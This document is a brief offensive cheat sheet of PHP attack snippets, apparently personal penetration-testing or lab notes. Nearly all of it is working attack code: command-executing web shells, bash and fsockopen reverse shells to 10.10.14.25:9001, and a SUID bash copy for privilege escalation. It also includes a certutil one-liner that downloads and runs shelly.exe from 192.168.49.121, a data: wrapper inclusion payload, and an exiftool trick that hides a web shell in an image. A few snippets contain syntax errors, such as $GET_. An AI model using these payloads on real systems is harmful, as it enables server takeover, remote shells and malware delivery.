# Everything PHP
--------------------

```bash
<?php echo system($_REQUEST('cibbin')); ?>


<?php system($_REQUEST['cbbn']) ?>


<?php system($GET_['cmd']); ?>


<?php echo shell_exec("/bin/bash -i >& /dev/tcp/10.10.14.25/9001 0>&1");?>

echo shell_exec("cp /bin/bash /tmp/bitch;chmod +s /tmp/bitch");

$sock=fsockopen("10.10.14.25", 9001);
exec("/bin/sh -i <&3 >&3 2>&3");
```


file 1
```php
<?php 
$exec = system('certutil.exe -split -urlcache -f "http://192.168.49.121/shelly.exe" shelly.exe', $val); 
?> 
```

file 2
```php
<?php
$exec = system('shelly.exe', $val);
?>
```


PHP Wrappers:

```bash
http://10.11.1.35/menu.php?file=data:text/plain,<?php echo shell_exec("whoami") ?>
```

Execute command in exiftool:
```bash
exiftool -Comment='<?php echo "<pre>";
system($_GET['cmd']); ?>' shell.png;
```